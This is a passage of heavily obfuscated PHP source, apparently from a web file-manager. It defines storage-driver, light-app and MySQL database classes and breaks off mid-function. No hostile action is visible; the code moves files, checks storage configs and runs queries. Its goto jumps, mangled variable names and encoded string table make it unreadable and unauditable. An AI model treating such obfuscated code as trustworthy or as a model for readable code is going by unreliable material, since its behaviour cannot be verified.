<?php
 goto c§å‡ˆ»ÙÄ; bŸ„èÈÃå: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\163\157\x75\162\x63\x65\123\145\143\162\x65\164\x4c\151\163\x74"; public $field = array("\163\157\x75\x72\x63\145\111\x44", "\x74\171\x70\x65\111\104", "\x63\x72\145\141\164\145\125\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\x73\x74\157\162\141\x67\145\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x73\151\x7a\145\x4d\x61\x78", "\163\171\x73\164\x65\155", "\x64\x65\x66\x61\165\154\164", "\144\162\151\x76\145\x72", "\x63\x6f\x6e\146\151\147"); public function listData($êğŸ»ìë = false, $É¾æèÍŸ = "\155\x6f\144\x69\x66\171\x54\x69\x6d\145", $áÉ±‰ = false) { $˜›®¹±€ =& $_SERVER[©—Ò»ÅĞ]; $í„ÍÏä² = parent::listData($êğŸ»ìë, $É¾æèÍŸ, $áÉ±‰); if ($êğŸ»ìë) { return $í„ÍÏä²; } $¶¼à°³ = array(); if ($GLOBALS[$˜›®¹±€[2515]]) { $¶¼à°³ = $this->ioSizeUseGet(array_to_keyvalue($í„ÍÏä², $˜›®¹±€[12], $˜›®¹±€[487])); } foreach ($í„ÍÏä² as $¸ğ­êÀ— => $™³®ù›¢) { unset($í„ÍÏä²[$¸ğ­êÀ—][$˜›®¹±€[6]]); $í„ÍÏä²[$¸ğ­êÀ—][$˜›®¹±€[2171]] = isset($¶¼à°³[$™³®ù›¢[$˜›®¹±€[487]]]) ? $¶¼à°³[$™³®ù›¢[$˜›®¹±€[487]]] : 0; } return $í„ÍÏä²; } public function ioSizeUseGet($ë¿“İ•½) { $äóÌ˜– =& $_SERVER[©—Ò»ÅĞ]; if (!$ë¿“İ•½) { return array(); } $Š£‰¡¸ó = $äóÌ˜–[2516] . implode($äóÌ˜–[50], $ë¿“İ•½); $Ô²¾ú = Cache::get($Š£‰¡¸ó); if ($Ô²¾ú) { return $Ô²¾ú; } $º»ºÈî§ = array($äóÌ˜–[926] => $äóÌ˜–[487], $äóÌ˜–[2517] => $äóÌ˜–[79]); $ û¼Í¶ = array($äóÌ˜–[926] => array($äóÌ˜–[7], $ë¿“İ•½)); $Ô²¾ú = Model($äóÌ˜–[916])->field($º»ºÈî§)->where($ û¼Í¶)->group($äóÌ˜–[926])->select(); $Ô²¾ú = array_to_keyvalue($Ô²¾ú, $äóÌ˜–[487], $äóÌ˜–[79]); Cache::set($Š£‰¡¸ó, $Ô²¾ú, 600); return $Ô²¾ú; } public function getConfig($ì¨®ı£ú) { $³Á’º½ = parent::listData($ì¨®ı£ú); $àÉ²¡Í‘ = _get($³Á’º½, $_SERVER[©—Ò»ÅĞ][6], array()); if ($àÉ²¡Í‘ && !is_array($àÉ²¡Í‘)) { $àÉ²¡Í‘ = json_decode($àÉ²¡Í‘, !0); } return $àÉ²¡Í‘; } public function update($šÔ£“¾, $´ºÏŒş) { $çõ¡Ç”¾ =& $_SERVER[©—Ò»ÅĞ]; $Ğç’ÓË = $´ºÏŒş[$çõ¡Ç”¾[32]]; $–“†Å¤Ê = array_to_keyvalue(parent::listData(), $çõ¡Ç”¾[32]); if (isset($–“†Å¤Ê[$Ğç’ÓË]) && $–“†Å¤Ê[$Ğç’ÓË][$çõ¡Ç”¾[487]] != $šÔ£“¾) { return !1; } $this->checkPwd($šÔ£“¾, $´ºÏŒş); if (isset($´ºÏŒş[$çõ¡Ç”¾[2518]]) && $´ºÏŒş[$çõ¡Ç”¾[2518]] == $çõ¡Ç”¾[91]) { $this->checkConfig($´ºÏŒş); } unset($´ºÏŒş[$çõ¡Ç”¾[2518]]); $µÅô°Ó» = parent::update($šÔ£“¾, $´ºÏŒş); if ($µÅô°Ó» && $´ºÏŒş[$çõ¡Ç”¾[37]]) { foreach ($–“†Å¤Ê as $‡ø½í°Ì) { if ($‡ø½í°Ì[$çõ¡Ç”¾[37]] && $‡ø½í°Ì[$çõ¡Ç”¾[487]] != $šÔ£“¾) { parent::update($‡ø½í°Ì[$çõ¡Ç”¾[487]], array($çõ¡Ç”¾[37] => 0)); } } $this->updateBackup($šÔ£“¾, $–“†Å¤Ê); } return $µÅô°Ó»; } public function add($Òı„¡Ô) { $“£“ßşä =& $_SERVER[©—Ò»ÅĞ]; $Æ—•Æ¯Ñ = array_to_keyvalue(parent::listData(), $“£“ßşä[32]); if (isset($Æ—•Æ¯Ñ[$Òı„¡Ô[$“£“ßşä[32]]])) { return !1; } $this->checkConfig($Òı„¡Ô); $€ô€ôíñ = parent::insert($Òı„¡Ô); if ($€ô€ôíñ && $Òı„¡Ô[$“£“ßşä[37]]) { foreach ($Æ—•Æ¯Ñ as $»ã¡äç) { if ($»ã¡äç[$“£“ßşä[37]]) { parent::update($»ã¡äç[$“£“ßşä[487]], array($“£“ßşä[37] => 0)); } } $this->updateBackup($€ô€ôíñ, $Æ—•Æ¯Ñ); } return $€ô€ôíñ; } public function updateBackup($å¡º†ëß, $¦œè¼ê˜) { $‰û×ºƒ¶ =& $_SERVER[©—Ò»ÅĞ]; $³Üàš¢Š = Model($‰û×ºƒ¶[873])->get($‰û×ºƒ¶[879]); $³Üàš¢Š = json_decode($³Üàš¢Š, !0); if (!$³Üàš¢Š) { return; } if ($³Üàš¢Š[$‰û×ºƒ¶[1948]] != $‰û×ºƒ¶[91]) { return; } $¡—¾ççè = $³Üàš¢Š[$‰û×ºƒ¶[852]]; if ($³Üàš¢Š[$‰û×ºƒ¶[168]] != $‰û×ºƒ¶[1308]) { if ($¡—¾ççè != $å¡º†ëß) { return; } $³Üàš¢Š[$‰û×ºƒ¶[168]] = $‰û×ºƒ¶[1308]; } else { if ($¡—¾ççè == $å¡º†ëß) { return; } $³Üàš¢Š[$‰û×ºƒ¶[852]] = $å¡º†ëß; } Model($‰û×ºƒ¶[873])->set(array($‰û×ºƒ¶[879] => $³Üàš¢Š)); } public function checkPwd($–ôİ˜¹, &$ê™«È¾â) { $Š­ËÏ‹´ =& $_SERVER[©—Ò»ÅĞ]; if (empty($ê™«È¾â[$Š­ËÏ‹´[6]])) { return; } $ûÖî× Ã = $ê™«È¾â[$Š­ËÏ‹´[6]]; if (!is_array($ûÖî× Ã)) { $ûÖî× Ã = json_decode($ûÖî× Ã, !0); } $ıü¾Àûæ = $Š­ËÏ‹´[12]; $½´äş¯ = array($Š­ËÏ‹´[1641], $Š­ËÏ‹´[2519], $Š­ËÏ‹´[1050]); foreach ($½´äş¯ as $±‰Ê¸Â‡) { if (isset($ûÖî× Ã[$±‰Ê¸Â‡])) { $ıü¾Àûæ = $±‰Ê¸Â‡; break; } } if (!$ıü¾Àûæ) { return; } $æíÔ©Ú­ = $this->getConfig($–ôİ˜¹); $ÅëÖ¢Éø = $æíÔ©Ú­[$ıü¾Àûæ]; $«÷«‚„ = $ûÖî× Ã[$ıü¾Àûæ]; if ($«÷«‚„ == str_repeat($Š­ËÏ‹´[220], strlen($ÅëÖ¢Éø))) { $ûÖî× Ã[$ıü¾Àûæ] = $ÅëÖ¢Éø; $ê™«È¾â[$Š­ËÏ‹´[6]] = json_encode($ûÖî× Ã); } else { if ($«÷«‚„ != $ÅëÖ¢Éø) { $ê™«È¾â[$Š­ËÏ‹´[2518]] = $Š­ËÏ‹´[91]; } } } public function checkConfig(&$¬ÔŞ”µº, $¯¨±Ûî = false) { $ùÈÆ€Š˜ =& $_SERVER[©—Ò»ÅĞ]; $·æÄ¹ùæ = strtolower($¬ÔŞ”µº[$ùÈÆ€Š˜[96]]); $êß…ÃµË = $¬ÔŞ”µº[$ùÈÆ€Š˜[6]]; if (!is_array($êß…ÃµË)) { $êß…ÃµË = json_decode($êß…ÃµË, !0); } foreach ($êß…ÃµË as $Îø•Â => $³¥œÍ³í) { if (is_string($³¥œÍ³í)) { $êß…ÃµË[$Îø•Â] = trim($³¥œÍ³í); } } $êß…ÃµË[$ùÈÆ€Š˜[2520]] = rand_string(6); $´˜Š²°¾ = $GLOBALS[$ùÈÆ€Š˜[6]][$ùÈÆ€Š˜[92]][$ùÈÆ€Š˜[934]]; $––Ã¥û = isset($´˜Š²°¾[$·æÄ¹ùæ]) ? $´˜Š²°¾[$·æÄ¹ùæ] : ucfirst($·æÄ¹ùæ); $é­îÛŸ÷ = $ùÈÆ€Š˜[77] . $––Ã¥û; if (!$––Ã¥û || !class_exists($é­îÛŸ÷)) { if ($¯¨±Ûî) { return LNG($ùÈÆ€Š˜[2521]); } write_log(array($ùÈÆ€Š˜[2522], $¬ÔŞ”µº, get_caller_info()), $ùÈÆ€Š˜[213]); show_json(LNG($ùÈÆ€Š˜[2521]), !1, $¬ÔŞ”µº); } $Å°¢…É = new $é­îÛŸ÷($êß…ÃµË); $ôø²¿£ş = rtrim($êß…ÃµË[$ùÈÆ€Š˜[1369]], $ùÈÆ€Š˜[8]) . $ùÈÆ€Š˜[8]; if (in_array($·æÄ¹ùæ, $Å°¢…É->objectDriver)) { try { if (!$Å°¢…É->isBucketCors() && !$Å°¢…É->setBucketCors()) { $³Ş’Ø = LNG($ùÈÆ€Š˜[2523]); $³Ş’Ø .= $ùÈÆ€Š˜[2524] . LNG($ùÈÆ€Š˜[2525]); } } catch (Exception $€¡ëÜ‡á) { $³Ş’Ø = $€¡ëÜ‡á->getMessage(); } if (isset($³Ş’Ø)) { return $this->_parseError($³Ş’Ø, $·æÄ¹ùæ, $¯¨±Ûî); } if ($·æÄ¹ùæ == $ùÈÆ€Š˜[68]) { $Î­ŞßÒ˜ = $Å°¢…É->getBktRegion(); if ($Î­ŞßÒ˜ != $êß…ÃµË[$ùÈÆ€Š˜[2526]]) { $êß…ÃµË[$ùÈÆ€Š˜[2526]] = $Î­ŞßÒ˜; $Å°¢…É->setRegion($Î­ŞßÒ˜); } } } else { if ($·æÄ¹ùæ == $ùÈÆ€Š˜[2527]) { if ($Å°¢…É->ftpPath) { $†§„Å‡³ = trim($ôø²¿£ş, $ùÈÆ€Š˜[8]); if (stripos($†§„Å‡³, trim($Å°¢…É->ftpPath, $ùÈÆ€Š˜[8])) !== 0) { $ôø²¿£ş = $Å°¢…É->ftpPath . $ùÈÆ€Š˜[8] . ($†§„Å‡³ ? $†§„Å‡³ . $ùÈÆ€Š˜[8] : $ùÈÆ€Š˜[12]); } } } } $ÀœéØæŒ = $Å°¢…É->getPath($ôø²¿£ş . $ùÈÆ€Š˜[1373]); try { if ($·æÄ¹ùæ == $ùÈÆ€Š˜[106]) { $Å°¢…É->mkdir($ôø²¿£ş, REPEAT_SKIP); } $ı§±ˆã = $Å°¢…É->mkfile($ÀœéØæŒ, $ùÈÆ€Š˜[12], REPEAT_REPLACE); if (!$ı§±ˆã) { $³Ş’Ø = LNG($ùÈÆ€Š˜[2523]); } } catch (Exception $€¡ëÜ‡á) { $³Ş’Ø = $€¡ëÜ‡á->getMessage(); } if (isset($³Ş’Ø)) { return $this->_parseError($³Ş’Ø, $·æÄ¹ùæ, $¯¨±Ûî); } $êß…ÃµË[$ùÈÆ€Š˜[1369]] = $ôø²¿£ş; $¬ÔŞ”µº[$ùÈÆ€Š˜[6]] = json_encode($êß…ÃµË); $¬ÔŞ”µº[$ùÈÆ€Š˜[96]] = $––Ã¥û; return !0; } private function _parseError($‘“µâ×, $âĞ±Øèú, $…›Í¾Ë÷ = false) { $àçúÚ” =& $_SERVER[©—Ò»ÅĞ]; if ($âĞ±Øèú == $àçúÚ”[68] && stripos($‘“µâ×, $àçúÚ”[2528])) { $Ùñî¢€¸ = explode($àçúÚ”[10], $‘“µâ×); $ù³ÔõÁ½ = isset($Ùñî¢€¸[1]) ? $Ùñî¢€¸[1] : $àçúÚ”[12]; $ËŒ¢ÚË¾ = array($àçúÚ”[2529] => LNG($àçúÚ”[2530]), $àçúÚ”[2531] => LNG($àçúÚ”[2532])); if (isset($ËŒ¢ÚË¾[$ù³ÔõÁ½])) { $‘“µâ× = $ËŒ¢ÚË¾[$ù³ÔõÁ½]; } } if (stripos($‘“µâ×, $àçúÚ”[2533]) === 0) { $¢µâÄ¹Ú = strpos($‘“µâ×, $àçúÚ”[175]); if ($¢µâÄ¹Ú === !1) { $¢µâÄ¹Ú = strpos($‘“µâ×, $àçúÚ”[4]); } if ($¢µâÄ¹Ú !== !1) { $‘“µâ× = substr($‘“µâ×, $¢µâÄ¹Ú + 1); } } $‘“µâ× = LNG($àçúÚ”[1376]) . $‘“µâ×; if ($…›Í¾Ë÷) { return $‘“µâ×; } show_json($‘“µâ×, !1); } public function driverListSystem() { $®ş¥Çö =& $_SERVER[©—Ò»ÅĞ]; $ç…§Æ– = parent::listData(); $Ü ºŠ¹¨ = array(); foreach ($ç…§Æ– as $õ¥íı–) { unset($õ¥íı–[$®ş¥Çö[231]], $õ¥íı–[$®ş¥Çö[88]]); if (!is_array($õ¥íı–[$®ş¥Çö[6]])) { $õ¥íı–[$®ş¥Çö[6]] = json_decode($õ¥íı–[$®ş¥Çö[6]], !0); } $Ü ºŠ¹¨[] = $õ¥íı–; } return $Ü ºŠ¹¨; } public function defaultDriver() { $ç˜…Ğßå =& $_SERVER[©—Ò»ÅĞ]; $„­©îÁ‡ = parent::listData(); $Ú„ ­Â± = array_filter_by_field($„­©îÁ‡, $ç˜…Ğßå[37], 1); $Ú„ ­Â± = $Ú„ ­Â±[0]; if (!$Ú„ ­Â±) { return array(); } if (!is_array($Ú„ ­Â±[$ç˜…Ğßå[6]])) { $Ú„ ­Â±[$ç˜…Ğßå[6]] = json_decode($Ú„ ­Â±[$ç˜…Ğßå[6]], !0); } return $Ú„ ­Â±; } public function driverInfo($µ¶½’ñ») { $éÄÇåí® =& $_SERVER[©—Ò»ÅĞ]; $–÷ë¬Â® = array_to_keyvalue(parent::listData(), $éÄÇåí®[487]); if (!isset($–÷ë¬Â®[$µ¶½’ñ»])) { return !1; } $Üâ»É• = $–÷ë¬Â®[$µ¶½’ñ»]; if (!is_array($Üâ»É•[$éÄÇåí®[6]])) { $Üâ»É•[$éÄÇåí®[6]] = json_decode($Üâ»É•[$éÄÇåí®[6]], !0); } return $Üâ»É•; } public function remove($‚éú×ùë) { $this->removeShareItems($‚éú×ùë); return parent::remove($‚éú×ùë); } public function removeWithFile($éßˆÕşæ, $¨½»—Ü, $Œìóæû», $—©©«í¡ = false) { $çç‹ºª =& $_SERVER[©—Ò»ÅĞ]; ignore_timeout(); $£ªìòÄâ = array($çç‹ºª[926] => $éßˆÕşæ); $Ã…ªËø = Model($çç‹ºª[560]); if (isset($GLOBALS[$çç‹ºª[2534]])) { $’ğÌÌÊç = $GLOBALS[$çç‹ºª[2534]]; } else { $’ğÌÌÊç = $Ã…ªËø->where($£ªìòÄâ)->field(array($çç‹ºª[949] => $çç‹ºª[950], $çç‹ºª[951] => $çç‹ºª[79]))->find(); } $ìÔãßº¸ = intval($’ğÌÌÊç[$çç‹ºª[950]]); $Ğí÷‹™İ = intval($’ğÌÌÊç[$çç‹ºª[79]]); $ˆÄÃí¬ = $¨½»—Ü . $çç‹ºª[2535] . $éßˆÕşæ; $°Õì¬øè = LNG($¨½»—Ü == $çç‹ºª[643] ? $çç‹ºª[2536] : $çç‹ºª[2537]); $™ó™öÑà = new TaskFileTransfer($ˆÄÃí¬, $çç‹ºª[213], $ìÔãßº¸, $°Õì¬øè . $çç‹ºª[476] . $Œìóæû»[$çç‹ºª[32]] . $çç‹ºª[212] . $éßˆÕşæ); $™ó™öÑà->task[$çç‹ºª[864]] = (double) $Ğí÷‹™İ; $×¤²”‡ = KodIO::defaultDriver(); $ŸéÙÀÛ™ = $×¤²”‡[$çç‹ºª[487]]; $ë“õÂ§Ë = 1; $çÊÔşæ· = 5000; $áæôÛÑ = $ëè¹šú“ = $ò”ãß¥È = array(); $²æ±”– = $Ã…ªËø->where($£ªìòÄâ)->field($çç‹ºª[2538])->selectPage($çÊÔşæ·, $ë“õÂ§Ë); $íª¡µ™ï = intval($²æ±”–[$çç‹ºª[443]][$çç‹ºª[445]]); while ($²æ±”– && $ë“õÂ§Ë <= $íª¡µ™ï) { foreach ($²æ±”–[$çç‹ºª[446]] as $ªæœë ä) { $ÏŠÖğù¨ = $ªæœë ä[$çç‹ºª[557]]; if ($—©©«í¡) { $ëè¹šú“[] = $ÏŠÖğù¨; continue; } $Í«å…‡Œ = $ªæœë ä[$çç‹ºª[87]]; $€öô—Æ³ = rtrim(get_path_father($Í«å…‡Œ), $çç‹ºª[8]) . $çç‹ºª[8]; $ò”ãß¥È[] = $€öô—Æ³; $€öô—Æ³ = str_replace("\173\x69\157\72{$éßˆÕşæ}\175\x2f", "\x7b\x69\x6f\x3a{$ŸéÙÀÛ™}\175\x2f", $€öô—Æ³); if (!IO::exist($Í«å…‡Œ) || !IO::isFile($Í«å…‡Œ)) { $áæôÛÑ[] = $ÏŠÖğù¨; $™ó™öÑà->updateFileEnd($ªæœë ä[$çç‹ºª[32]], $ªæœë ä[$çç‹ºª[79]]); write_log($çç‹ºª[2539] . $Í«å…‡Œ, $çç‹ºª[2118]); continue; } $àµóª€ç = IO::move($Í«å…‡Œ, $€öô—Æ³, REPEAT_RENAME); if (!$àµóª€ç) { $ëè¹šú“[] = $ÏŠÖğù¨; $™ó™öÑà->updateFileEnd($ªæœë ä[$çç‹ºª[32]], $ªæœë ä[$çç‹ºª[79]]); write_log($çç‹ºª[2540] . $Í«å…‡Œ, $çç‹ºª[2118]); continue; } $³­¼Úæ  = array($çç‹ºª[926] => $ŸéÙÀÛ™, $çç‹ºª[87] => $àµóª€ç); $Ã…ªËø->where(array($çç‹ºª[557] => $ÏŠÖğù¨))->save($³­¼Úæ ); } $ë“õÂ§Ë++; $²æ±”– = $Ã…ªËø->where($£ªìòÄâ)->field($çç‹ºª[2538])->selectPage($çÊÔşæ·, $ë“õÂ§Ë); } $íÂ”‹ş = $™ó™öÑà->task; if (!$—©©«í¡) { Cache::set($ˆÄÃí¬, $íÂ”‹ş); } $™ó™öÑà->end(); $áæôÛÑ = array_unique($áæôÛÑ); $ëè¹šú“ = array_unique($ëè¹šú“); if (!$—©©«í¡ && ($áæôÛÑ || $ëè¹šú“)) { $Õ²ªñ”ï = array(); if ($áæôÛÑ) { $Õ²ªñ”ï[] = sprintf(LNG($çç‹ºª[2541]), count($áæôÛÑ)); } if ($ëè¹šú“) { $Õ²ªñ”ï[] = sprintf(LNG($çç‹ºª[2542]), count($ëè¹šú“)); } $Õ²ªñ”ï = sprintf(LNG($çç‹ºª[2543]), implode($çç‹ºª[1586], $Õ²ªñ”ï)) . $çç‹ºª[2544] . date($çç‹ºª[2545]) . $çç‹ºª[2546]; if ($¨½»—Ü == $çç‹ºª[1334]) { $Õ²ªñ”ï .= $çç‹ºª[2547] . LNG($çç‹ºª[2548]); } else { $Õ²ªñ”ï = LNG($çç‹ºª[2549]) . $çç‹ºª[2550] . $Õ²ªñ”ï; } $íÂ”‹ş[$çç‹ºª[1371]] = $Õ²ªñ”ï; Cache::set($ˆÄÃí¬, $íÂ”‹ş); unset($Œìóæû»[$çç‹ºª[6]]); $šÈ¹ì»Û = array($çç‹ºª[487] => $éßˆÕşæ, $çç‹ºª[2424] => $çç‹ºª[643], $çç‹ºª[32] => $Œìóæû»[$çç‹ºª[32]], $çç‹ºª[96] => $Œìóæû»[$çç‹ºª[96]]); Hook::trigger($çç‹ºª[1988], array($çç‹ºª[1392] => $šÈ¹ì»Û, $çç‹ºª[1402] => !0)); show_json($Õ²ªñ”ï, !1, 100111); } if ($¨½»—Ü == $çç‹ºª[643]) { return !0; } if ($áæôÛÑ || $ëè¹šú“) { $¥×é§›­ = array_merge($áæôÛÑ, $ëè¹šú“); $¥×é§›­ = array_filter(array_unique($¥×é§›­)); $this->removeByFileID($¥×é§›­); } if ($ò”ãß¥È) { $ò”ãß¥È = array_filter(array_unique($ò”ãß¥È)); foreach ($ò”ãß¥È as $Í«å…‡Œ) { $’ğÌÌÊç = IO::has($Í«å…‡Œ, !0); if (!$’ğÌÌÊç[$çç‹ºª[239]] && !$’ğÌÌÊç[$çç‹ºª[240]]) { IO::remove($Í«å…‡Œ); } } } return $this->remove($éßˆÕşæ); } private function removeByFileID($‹Â¢¹»Ä = array()) { $ç¬ˆ¹ì¯ =& $_SERVER[©—Ò»ÅĞ]; if (empty($‹Â¢¹»Ä)) { return; } $ğ¦İ×öè = array($ç¬ˆ¹ì¯[557] => array($ç¬ˆ¹ì¯[7], $‹Â¢¹»Ä)); $‰×ùØÊ‚ = Model($ç¬ˆ¹ì¯[1533])->where($ğ¦İ×öè)->field($ç¬ˆ¹ì¯[2497])->select(); if (!$‰×ùØÊ‚) { return Model($ç¬ˆ¹ì¯[560])->remove($‹Â¢¹»Ä); } $‰×ùØÊ‚ = array_to_keyvalue($‰×ùØÊ‚, $ç¬ˆ¹ì¯[191], $ç¬ˆ¹ì¯[557]); foreach ($‰×ùØÊ‚ as $¬Ë·¢Í => $èØŒªÓ¾) { Model($ç¬ˆ¹ì¯[933])->removeNow($¬Ë·¢Í, !1); } $‰Çé¹Œ = array_diff($‹Â¢¹»Ä, array_unique(array_values($‰×ùØÊ‚))); if ($‰Çé¹Œ) { return Model($ç¬ˆ¹ì¯[560])->remove($‰Çé¹Œ); } } private function removeShareItems($¢âÈÜôÄ) { $›©‰”­§ =& $_SERVER[©—Ò»ÅĞ]; $¼Ãê¼­ = "\x7b\151\x6f\x3a{$¢âÈÜôÄ}\175\57"; $¨€ç¸” = array($›©‰”­§[191] => 0, $›©‰”­§[583] => array($›©‰”­§[473], "{$¼Ãê¼­}\x25")); $¢ŠÕ‡ùƒ = Model($›©‰”­§[1562])->where($¨€ç¸”)->field($›©‰”­§[687])->select(); if (empty($¢ŠÕ‡ùƒ)) { return; } $–ş—¤Š· = array_to_keyvalue($¢ŠÕ‡ùƒ, $›©‰”­§[12], $›©‰”­§[687]); Model($›©‰”­§[686])->remove($–ş—¤Š·); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x4c\151\147\150\164\x41\160\160"; public $modelType = "\123\x79\163\x74\145\155\x4f\160\164\x69\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\147\162\x6f\x75\x70", "\x64\145\163\x63", "\143\157\156\164\145\x6e\164"); public function listData($ü¿Ôñö = false, $õ¡»´Ç¬ = "\155\x6f\144\x69\x66\171\124\151\155\x65", $ıÏš’±Æ = true) { return parent::listData($ü¿Ôñö, $õ¡»´Ç¬, $ıÏš’±Æ); } public function remove($¼ö†àË„) { $×Ğ½ÀÒ = $this->findByName($¼ö†àË„); if (!$×Ğ½ÀÒ) { return !1; } return parent::remove($×Ğ½ÀÒ[$_SERVER[©—Ò»ÅĞ][487]]); } public function add($„ÖÂ±îÊ) { if ($this->findByName($„ÖÂ±îÊ[$_SERVER[©—Ò»ÅĞ][32]])) { return !1; } return parent::insert($„ÖÂ±îÊ); } public function update($×ÜÙ¯…ˆ, $íˆ“ÍÉ³) { $áó¦•»Š =& $_SERVER[©—Ò»ÅĞ]; $ÀÀö¬œË = $this->findByName($×ÜÙ¯…ˆ); $ç¹Äğ«Á = $this->findByName($íˆ“ÍÉ³[$áó¦•»Š[32]]); if (!$ÀÀö¬œË || $ç¹Äğ«Á && $ç¹Äğ«Á[$áó¦•»Š[487]] != $ÀÀö¬œË[$áó¦•»Š[487]]) { return !1; } return parent::update($ÀÀö¬œË[$áó¦•»Š[487]], $íˆ“ÍÉ³); } } goto F’ê…£šĞí; d®´ßÜ¬ğ÷: class DbMysql extends Db { public function __construct($Áá–ÈÒ¸ = '') { $Ÿ¥Ÿ¢ŒÅ =& $_SERVER[©—Ò»ÅĞ]; if (!extension_loaded($Ÿ¥Ÿ¢ŒÅ[901])) { think_exception(think_lang($Ÿ¥Ÿ¢ŒÅ[14]) . $Ÿ¥Ÿ¢ŒÅ[1046]); } if (!empty($Áá–ÈÒ¸)) { $this->config = $Áá–ÈÒ¸; if (empty($this->config[$Ÿ¥Ÿ¢ŒÅ[17]])) { $this->config[$Ÿ¥Ÿ¢ŒÅ[17]] = $Ÿ¥Ÿ¢ŒÅ[12]; } } } public function connect($ÏÁİ¯‚· = '', $ôŞáÑÅÊ = 0, $â½Œ™®Œ = false) { $¸øÛÃ¬¢ =& $_SERVER[©—Ò»ÅĞ]; if (!isset($this->linkID[$ôŞáÑÅÊ])) { if (empty($ÏÁİ¯‚·)) { $ÏÁİ¯‚· = $this->config; } $¥õåœë = $ÏÁİ¯‚·[$¸øÛÃ¬¢[1047]] . ($ÏÁİ¯‚·[$¸øÛÃ¬¢[1048]] ? "\72{$ÏÁİ¯‚·[$¸øÛÃ¬¢[1048]]}" : $¸øÛÃ¬¢[12]); $ŒÉšúìÄ = !empty($ÏÁİ¯‚·[$¸øÛÃ¬¢[17]][$¸øÛÃ¬¢[18]]) ? $ÏÁİ¯‚·[$¸øÛÃ¬¢[17]][$¸øÛÃ¬¢[18]] : $this->pconnect; if ($ŒÉšúìÄ) { $this->linkID[$ôŞáÑÅÊ] = mysql_pconnect($¥õåœë, $ÏÁİ¯‚·[$¸øÛÃ¬¢[1049]], $ÏÁİ¯‚·[$¸øÛÃ¬¢[1050]], 131072); } else { $this->linkID[$ôŞáÑÅÊ] = mysql_connect($¥õåœë, $ÏÁİ¯‚·[$¸øÛÃ¬¢[1049]], $ÏÁİ¯‚·[$¸øÛÃ¬¢[1050]], !0, 131072); } if (!$this->linkID[$ôŞáÑÅÊ] || !empty($ÏÁİ¯‚·[$¸øÛÃ¬¢[21]]) && !mysql_select_db($ÏÁİ¯‚·[$¸øÛÃ¬¢[21]], $this->linkID[$ôŞáÑÅÊ])) { think_exception(mysql_error()); } $˜Ééƒ˜à = mysql_get_server_info($this->linkID[$ôŞáÑÅÊ]); mysql_query($¸øÛÃ¬¢[1051] . think_config($¸øÛÃ¬¢[1052]) . $¸øÛÃ¬¢[58], $this->linkID[$ôŞáÑÅÊ]); if ($˜Ééƒ˜à > $¸øÛÃ¬¢[1053]) { mysql_query($¸øÛÃ¬¢[1054], $this->linkID[$ôŞáÑÅÊ]); } $this->connected = !0; if (1 != think_config($¸øÛÃ¬¢[22])) { unset($this->config); } } return $this->linkID[$ôŞáÑÅÊ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($éâ§ËÙ) { $°ä½éÙê =& $_SERVER[©—Ò»ÅĞ]; if (0 === stripos($éâ§ËÙ, $°ä½éÙê[342])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $éâ§ËÙ; if ($this->queryID) { $this->free(); } think_action_status($°ä½éÙê[23], 1); think_status($°ä½éÙê[24]); $this->queryID = mysql_query($éâ§ËÙ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ã˜ôÈ¦Ê) { $ºı™ÚˆÑ =& $_SERVER[©—Ò»ÅĞ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ã˜ôÈ¦Ê; if ($this->queryID) { $this->free(); } think_action_status($ºı™ÚˆÑ[25], 1); think_status($ºı™ÚˆÑ[24]); $°Ëğóï¿ = mysql_query($Ã˜ôÈ¦Ê, $this->_linkID); $this->debug(); if (!1 === $°Ëğóï¿) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[©—Ò»ÅĞ][1055], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÅıÆü = mysql_query($_SERVER[©—Ò»ÅĞ][1056], $this->_linkID); $this->transTimes = 0; if (!$ÅıÆü) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ù¹ø’Ù = mysql_query($_SERVER[©—Ò»ÅĞ][1057], $this->_linkID); $this->transTimes = 0; if (!$ù¹ø’Ù) { $this->error(); return !1; } } return !0; } private function getAll() { $ø¯ÖºŒ˜ = array(); if ($this->numRows > 0) { while ($ˆàğ„Ù = mysql_fetch_assoc($this->queryID)) { $ø¯ÖºŒ˜[] = $ˆàğ„Ù; } mysql_data_seek($this->queryID, 0); } return $ø¯ÖºŒ˜; } public function getFields($Êî²ÆÍ) { $ùó¤Ñã– =& $_SERVER[©—Ò»ÅĞ]; $„êËÌ–ã = $this->query($ùó¤Ñã–[1058] . $this->parseKey($Êî²ÆÍ)); $Í‡ÙõŒ³ = array(); if ($„êËÌ–ã) { foreach ($„êËÌ–ã as $²ã©â¥Ù => $¸Îûø÷Ã) { $Í‡ÙõŒ³[$¸Îûø÷Ã[$ùó¤Ñã–[31]]] = array($ùó¤Ñã–[32] => $¸Îûø÷Ã[$ùó¤Ñã–[31]], $ùó¤Ñã–[33] => $¸Îûø÷Ã[$ùó¤Ñã–[34]], $ùó¤Ñã–[35] => (bool) (strtoupper($¸Îûø÷Ã[$ùó¤Ñã–[36]]) === $ùó¤Ñã–[1059]), $ùó¤Ñã–[37] => $¸Îûø÷Ã[$ùó¤Ñã–[38]], $ùó¤Ñã–[39] => strtolower($¸Îûø÷Ã[$ùó¤Ñã–[40]]) == $ùó¤Ñã–[41], $ùó¤Ñã–[42] => strtolower($¸Îûø÷Ã[$ùó¤Ñã–[43]]) == $ùó¤Ñã–[44]); } } return $Í‡ÙõŒ³; } public function getTables($ÊÉ‘ú¼ = '') { $àè±şèì =& $_SERVER[©—Ò»ÅĞ]; if (!empty($ÊÉ‘ú¼)) { $ùçşŸ˜¦ = 